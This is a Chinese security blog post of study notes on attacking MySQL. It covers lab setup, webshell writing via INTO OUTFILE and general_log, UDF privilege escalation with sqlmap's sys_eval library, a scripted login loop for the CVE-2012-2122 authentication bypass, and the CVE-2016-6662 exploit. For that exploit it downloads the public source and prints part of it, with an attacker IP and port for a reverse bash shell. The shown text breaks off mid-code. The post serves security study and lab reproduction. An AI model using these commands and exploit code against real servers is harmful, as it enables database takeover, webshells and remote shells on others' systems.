<!-- build time:Fri Mar 22 2024 17:56:02 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" href="https://blog.xcu.icu/rss.xml"><link rel="alternate" type="application/atom+xml" href="https://blog.xcu.icu/atom.xml"><link rel="alternate" type="application/json" href="https://blog.xcu.icu/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="Mysql"><link rel="canonical" href="https://blog.xcu.icu/2024/01/31/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Mysql%E6%95%B0%E6%8D%AE%E5%BA%93/"><title>Mysql数据库安全 - 服务攻防 | ClownのBlog =</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">Mysql数据库安全</h1><div class="meta"><span class="item" title="创建时间：2024-01-31 00:00:00"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2024-01-31T00:00:00+08:00">2024-01-31</time> </span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">本文字数</span> <span>22k</span> <span class="text">字</span> </span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">阅读时长</span> <span>54 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">ClownのBlog</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/81.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/57.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/16.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/115.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/142.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/7.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/" itemprop="item" rel="index" title="分类于 服务攻防"><span itemprop="name">服务攻防</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://blog.xcu.icu/2024/01/31/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Mysql%E6%95%B0%E6%8D%AE%E5%BA%93/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="Clown"><meta itemprop="description" content=", 一个妄想全栈web小废物"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content=""></span><div class="body md" itemprop="articleBody"><h2 id="前言"><a class="anchor" href="#前言">#</a> 前言</h2><p>前面将常见的内存马都简单的学习了一下，前两天做题有遇到了有关数据库的安全性问题，回想了一下前面对于数据库的安全涉及的很乱，反正是了解的不多，这里就简单的总结一下。因为也是对 Mysql 数据库比较熟悉就先拿它开刀，全篇写写停停，逻辑可能较为混乱</p><h2 id="mysql是什么"><a class="anchor" href="#mysql是什么">#</a> Mysql 是什么？</h2><p>​	或许很多人和我一样是从 SQL 注入开始入门的 web 安全，至少我们专业课的 web 安全是从它开始的。我个人痛苦和脱发的开始便是从 sql-labs 展开的。MySQL 是一款开源的关系型数据库管理系统（RDBMS），由瑞典 MySQL AB 公司创建，现由 Oracle Corporation 维护。它使用结构化查询语言（SQL）进行数据库管理和操作，支持多用户、多线程，并可在各种操作系统上运行。MySQL 广泛用于 Web 应用程序，是许多网站和应用的后端数据库选择之一。</p><h2 id="环境搭建"><a class="anchor" href="#环境搭建">#</a> 环境搭建</h2><p>关于关系数据库相关的内容实际上我在学校里开相关的专业课的时候有简单的写过一些笔记，这里也不在过多的啰嗦<a href="https://blog.xcu.icu/categories/database/">分类：数据库 | Clown の Blog = (xcu.icu)</a>。这里直接搭建一个后面漏洞复现所需要的版本对应的环境。所需要的版本都可以在下面的连接中找到</p><figure class="highlight url"><figcaption data-lang="url"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token scheme">https<span class="token scheme-delimiter">:</span></span><span class="token authority"><span class="token authority-delimiter">//</span><span class="token host">downloads.mysql.com</span></span><span class="token path"><span class="token path-separator">/</span>archives<span class="token path-separator">/</span>community<span class="token path-separator">/</span></span></pre></td></tr></table></figure><p>选择下载 mysql5.7.10，本篇记录以 5.7.10 作为例子。下载时选择 源码方式，系统为常规 Linux，下载含有 Boost Headers 的源码包：</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240125203646965.png" alt="image-20240125203646965"></p><p>接下来就是环境的搭建，首先我们创建一个低权限用户来登录 mysql</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">useradd</span> <span class="token parameter variable">-s</span> /sbin/nologin mysql</pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240126120809047.png" alt="image-20240126120809047"></p><p>这里创建一个 mysql 的低权限用户，不允许其登录，将我们上面下载的源码上传并解压</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240126121310797.png" alt="image-20240126121310797"></p><p>在执行安装前我们还需要安装一下相关的依赖</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>yum <span class="token function">install</span> <span class="token parameter variable">-y</span> gcc gcc-c++ cmake ncurses ncurses-devel bison</pre></td></tr></table></figure><p>然后进入到刚刚解压的目录下执行下面的命令进行编译</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>cmake <span class="token parameter variable">-DDEFAULT_CHARSET</span><span class="token operator">=</span>utf8 <span class="token parameter variable">-DDEFAULT_COLLATION</span><span class="token operator">=</span>utf8_general_ci <span class="token parameter variable">-DWITH_BOOST</span><span class="token operator">=</span>boost</pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240126121555628.png" alt="image-20240126121555628"></p><p>然后使用 make 命令对其进行安装</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240126124225642.png" alt="image-20240126124225642"></p><div class="note info"><p>这个安装可以需要的时间比较久，建议在编译安装完成后快照一下，重装的痛苦</p><p>然后该配置 mysql 了，安装完 mysql 后会在 /usr/local/ 目录下创建一个 mysql 目录，首先修改 /etc/my.cnf 配置文件，当然这个文件不一定是会自动创建的，这个配置文件的模版文件放在 mysql 在 support-files 目录中</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240126125728956.png" alt="image-20240126125728956"></p><p>这个 my-default.cnf 文件复制过去即可，在其中将 basedir 等修改为下图所示</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240128180015691.png" alt="image-20240128180015691"></p><figure class="highlight txt"><figcaption data-lang="txt"></figcaption><table><tr><td data-num="1"></td><td><pre>basedir  设定为mysql所在的目录</pre></td></tr><tr><td data-num="2"></td><td><pre>datadir  设定为数据库文件存放目录</pre></td></tr><tr><td data-num="3"></td><td><pre>port     设定为数据库开放端口</pre></td></tr></table></figure><p>这里还需要将上面存放数据库文件的目录创建一下</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240126130448831.png" alt="image-20240126130448831"></p><p>然后创建 mysql 服务，进入到 mysql 目录下的 bin 目录</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>./mysqld --initialize-insecure <span class="token parameter variable">--user</span><span class="token operator">=</span>mysql <span class="token parameter variable">--basedir</span><span class="token operator">=</span>/usr/local/mysql <span class="token parameter variable">--datadir</span><span class="token operator">=</span>/usr/local/mysql/data</pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240126135025969.png" alt="image-20240126135025969"></p><p>这条命令执行完成后会在 mysql 的 support-files 目录下创建一个 mysql.server 文件，将 mysql.server 文件拷贝为 /etc/init.d/mysqld，然后这里就可以直接用这个 mysqld 命令启动了</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">cp</span> mysql.server /etc/init.d/mysqld</pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240128180822965.png" alt="image-20240128180822965"></p><p>到这里 mysql 环境就算是搭建完成了，这里把 mysql 命令加入到环境变量中</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token environment constant">$PATH</span>:/usr/local/mysql/bin</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token builtin class-name">source</span> ~/.bashrc</pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240128182211104.png" alt="image-20240128182211104"></p><p>这样可以了，然后我们创建一个用户</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>CREATE <span class="token environment constant">USER</span> <span class="token string">'Clown'</span>@<span class="token string">'localhost'</span> IDENTIFIED BY <span class="token string">'123456'</span><span class="token punctuation">;</span><span class="token comment">#创建一个新用户</span></pre></td></tr><tr><td data-num="2"></td><td><pre>GRANT ALL PRIVILEGES ON *.* TO <span class="token string">'clown'</span>@<span class="token string">'localhost'</span><span class="token punctuation">;</span><span class="token comment">#赋予权限</span></pre></td></tr><tr><td data-num="3"></td><td><pre>FLUSH PRIVILEGES<span class="token punctuation">;</span><span class="token comment">#刷新权限</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240128182617646.png" alt="image-20240128182617646"></p><h2 id="mysql的一些利用方式"><a class="anchor" href="#mysql的一些利用方式">#</a> mysql 的一些利用方式</h2><h3 id="webshell"><a class="anchor" href="#webshell">#</a> webshell</h3><h4 id="into-outfile"><a class="anchor" href="#into-outfile">#</a> into outfile</h4><p>这种利用方式可以说是在传统 ctf 中最为常见的一种利用方式了，当然利用也是有着许多前提条件的</p><ul><li>知道网站的绝对物理路径</li><li>数据库的高权限用户</li><li>secure_file_priv 无限制</li><li>对应的目录具有写入权限</li></ul><p>对于 secure_file_priv 我们可以通过下面的语句进行查询</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>show global variables like <span class="token string">'%secure_file_priv%'</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240130153043959.png" alt="image-20240130153043959"></p><p>值为空时不限制目录，值为 null 时不允许导入导出，值为一个目录的时候表示只能在该目录导入导出</p><div class="note info"><p>在 mysql5.5 之前默认都是空，之后默认为 null</p><p>如果满足上面的条件的情况下就可以通过 select 语句来向目标系统中写入 shell，类似下面的语句</p><figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">select</span> <span class="token string">'&lt;?php phpinfo(); ?>'</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/var/www/html/.conf.php'</span><span class="token punctuation">;</span></pre></td></tr></table></figure><h4 id="general_log"><a class="anchor" href="#general_log">#</a> general_log</h4><p>这种方式限制就比较多了，特别是 general_log 默认的情况下还是关闭的，想要利用这种方式我们需要满足下面的条件</p><ul><li>web 目录是可写的</li><li>高权限运行 mysql 或者 apache</li><li>在版本符合的情况下可以利用 CVE-2016-6662 来写入</li></ul><p>可以通过修改全局变量来写入文件</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>show global variables like <span class="token string">"%general%"</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240130160041723.png" alt="image-20240130160041723"></p><p>这里可以通过 set 来修改配置</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># 更改日志文件位置</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token builtin class-name">set</span> global general_log <span class="token operator">=</span> <span class="token string">"ON"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token builtin class-name">set</span> global <span class="token assign-left variable">general_log_file</span><span class="token operator">=</span><span class="token string">'/var/www/html/.conf.php'</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240130160937875.png" alt="image-20240130160937875"></p><p>设置完成后才去查看全局变量</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240130161304986.png" alt="image-20240130161304986"></p><p>然后直接向其中添加语句即可</p><figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">select</span> <span class="token string">'&lt;?php phpinfo();?>'</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240130161745460.png" alt="image-20240130161745460"></p><p>上面两种方法在 linux 系统中的成功率都不会很高，因为在 linux 中的权限校验比较严格。如果是在 win 系统中成功率会高上很多</p><h3 id="udf提权"><a class="anchor" href="#udf提权">#</a> UDF 提权</h3><p>UDF 全称 user defined function，直译就是用户自定义函数。通过添加新函数对 mysql 功能进行扩充，类似 user (),database ()，很显然的是我们想要利用 UDF 我们的基础权限就需要很高，拥有高权限后我们就可以通过编写自己的连接文件让 mysql 调用来实现我们自定义的命令</p><p>从 MySQL 5.0.67 开始，UDF 的动态链接库必须放在 mysql 安装目录的 lib\plugin 文件夹中才能创建自定义函数，这个位置我们是可以通过 sql 语句来查询到的</p><figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">select</span> @<span class="token variable">@plugin_dir</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#或者</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">show</span> <span class="token keyword">global</span> variables <span class="token operator">like</span> <span class="token string">'plugin%'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">#或者</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">select</span> host<span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">,</span>plugin <span class="token keyword">from</span> mysql<span class="token punctuation">.</span><span class="token keyword">user</span> <span class="token keyword">where</span> <span class="token keyword">user</span> <span class="token operator">=</span> substring_index<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'@'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240130165119673.png" alt="image-20240130165119673"></p><div class="note info"><p>如果 plugin_dir 的值为空，则参照 5.0.67 之前即文件必须位于系统动态链接器的搜索目录中。</p><p>sqlmap 中自带了对应系统的连接库文件</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240130171651626.png" alt="image-20240130171651626"></p><p>这里先用脚本对链接库进行解密</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>python cloak.py <span class="token parameter variable">-d</span> <span class="token parameter variable">-i</span> E:<span class="token punctuation">\</span>webtools<span class="token punctuation">\</span>sqlmap<span class="token punctuation">\</span>data<span class="token punctuation">\</span>udf<span class="token punctuation">\</span>mysql<span class="token punctuation">\</span>linux<span class="token punctuation">\</span><span class="token number">64</span><span class="token punctuation">\</span>lib_mysqludf_sys.so_</pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240131164008450.png" alt="image-20240131164008450"></p><p>这里会生成一个对应的解密后的文件，这里可以通过下面的命令查看有哪些命令可以用</p><pre><code>nm -D lib_mysqludf_sys.so
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240131164349749.png" alt="image-20240131164349749"></p><p>接下来就是想办法加链接文件上传，上传到上面查询的 plugin 目录下，但是这个文件不一定存在，可以通过利用 NTFS ADS 流来创建文件夹</p><figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">select</span> <span class="token string">""</span> <span class="token keyword">into</span> <span class="token keyword">dumpfile</span> <span class="token string">'D:\\PhpStudy\\MySQL\\lib\\plugin::$index_allocation'</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>然后直接将文件导入就可以了</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">select</span> 0x上面的一长串 into dumpfile <span class="token string">"/usr/lib/mysql/p1ugin/udf.so"</span></pre></td></tr><tr><td data-num="2"></td><td><pre>create <span class="token keyword">function</span> sys_eval returns string soname <span class="token string">"udf.so"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#删除</span></pre></td></tr><tr><td data-num="4"></td><td><pre>drop <span class="token keyword">function</span> sys_eval<span class="token punctuation">;</span></pre></td></tr></table></figure><h4 id="udf-shell"><a class="anchor" href="#udf-shell">#</a> udf shell</h4><p>在目标 MySQL 在内网情况下，我们没法直连，使用起来就很麻烦，实际上 Navicat 提供了 tunnel 隧道脚本</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240131170821933.png" alt="image-20240131170821933"></p><p>我们可以将脚本上传</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240131170855899.png" alt="image-20240131170855899"></p><p>然后连接的时候就可以选择 http 连接</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240131171104589.png" alt="image-20240131171104589"></p><p>然后再尝试连接的时候主机名填写 127.0.0.1 即可</p><h2 id="漏洞复现"><a class="anchor" href="#漏洞复现">#</a> 漏洞复现</h2><h3 id="cve-2012-2122"><a class="anchor" href="#cve-2012-2122">#</a> CVE-2012-2122</h3><p>影响范围：</p><p>Mariadb 和 mysql 版本：5.1.61、5.0.11、5.3.5、5.5.22</p><p>这个漏洞实际上很简单，至少利用起来是很简单的，漏洞成因这里也简单说一下，实际上基本遇不到了</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240128192928902.png" alt="image-20240128192928902"></p><p>这里我下载了一份 mysql-5.1.61 的源码，在 sql 目录下的 password.c 文件中有这样一个函数，在连接数据库的时候，用户键入的密码会与期望的正确密码相比较，这里的 memcmp 函数的返回值实际上是 int，但是 my_bool 实际上是 char，在类型转化的时候就可以回发生截断，比如说实际上是 0x100，截断导致结果为 0，check_scramble 函数的返回结果就变成了完全相反的，就会导致判断用户键入的密码与预期的正确密码相同。在上面搭建的 5.7.10 的版本中相同位置代码如下</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240128193751455.png" alt="image-20240128193751455"></p><p>这个的影响版本已经很久远了，所以这里就不在搭建环境，直接使用 vulhub 中的环境来复现</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240128194102704.png" alt="image-20240128194102704"></p><p>这里环境启动后直接利用</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">`</span><span class="token function">seq</span> <span class="token number">1</span> <span class="token number">1000</span><span class="token variable">`</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span> mysql <span class="token parameter variable">-u</span> root <span class="token parameter variable">--password</span><span class="token operator">=</span>bad <span class="token parameter variable">-h</span> <span class="token number">127.0</span>.0.1 <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span class="token punctuation">;</span> <span class="token keyword">done</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240128194444208.png" alt="image-20240128194444208"></p><p>当然在 msf 中也有对应的漏洞利用模块：auxiliary/scanner/mysql/mysql_authbypass_hashdump</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240128195435069.png" alt="image-20240128195435069"></p><p>这里还是用上面的环境</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240128195418645.png" alt="image-20240128195418645"></p><p>这里就拿到了密码 123456</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240128195518981.png" alt="image-20240128195518981"></p><p>验证成功</p><div class="note success"><p>在数据库中可以这样 select host, user, password from mysql.user; 或者 SELECT host, user, authentication_string FROM mysql.user; 来查询数据库的用户名密码的 hash 值</p><h3 id="cve-2016-6662"><a class="anchor" href="#cve-2016-6662">#</a> CVE-2016-6662</h3><h4 id="攻击演示"><a class="anchor" href="#攻击演示">#</a> 攻击演示</h4><p>影响范围 ：</p><p>MySQL &lt;= 5.7.14 MySQL &lt;= 5.6.32 MySQL &lt;= 5.5.51</p><p>漏洞成因：</p><p>mysql 安装包里有一个 mysqld_safe 的脚本用来启动 mysql 的服务进程如下图</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240128180822965.png" alt="image-20240128180822965"></p><p>这个进程能在启动 mysql 之前预加载共享库文件，通过参数</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>–malloc-lib <span class="token operator">=</span> LIB /usr/local/mysql/bin/mysqld_safe:</pre></td></tr></table></figure><p>但是由于是配置文件来指定对应的 so 文件，mysql 服务需要重新启动才会加载配置文件。</p><p>先演示一下整个过程，这里现将对应的攻击脚本下载下来</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">wget</span> https://legalhackers.com/exploits/mysql_hookandroot_lib.c</pre></td></tr></table></figure><p>下面是 exp 的主要内容</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;dlfcn.h></span></span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdarg.h></span></span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;netinet/in.h></span></span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;arpa/inet.h></span></span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ATTACKERS_IP</span> <span class="token string">"192.168.246.136"</span><span class="token comment">// 攻击机的 ip</span></span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SHELL_PORT</span> <span class="token expression"><span class="token number">6667</span></span><span class="token comment">// 攻击机监听的端口</span></span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">INJECTED_CONF</span> <span class="token string">"/etc/mysql/my.cnf"</span><span class="token comment">// 目标机配置文件所在的位置</span></span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token keyword">char</span><span class="token operator">*</span> env_list<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string">"HOME=/root"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token keyword">typedef</span> <span class="token class-name">ssize_t</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token class-name">execvp_func_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>__file<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token keyword">const</span> __argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token keyword">static</span> <span class="token class-name">execvp_func_t</span> old_execvp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token comment">//fork&amp; 在启动 mysqld 之前向攻击者发送一个 bash shell</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token comment">// 创建一个 TCP 连接并反向 shell 连接到攻击者主机</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span 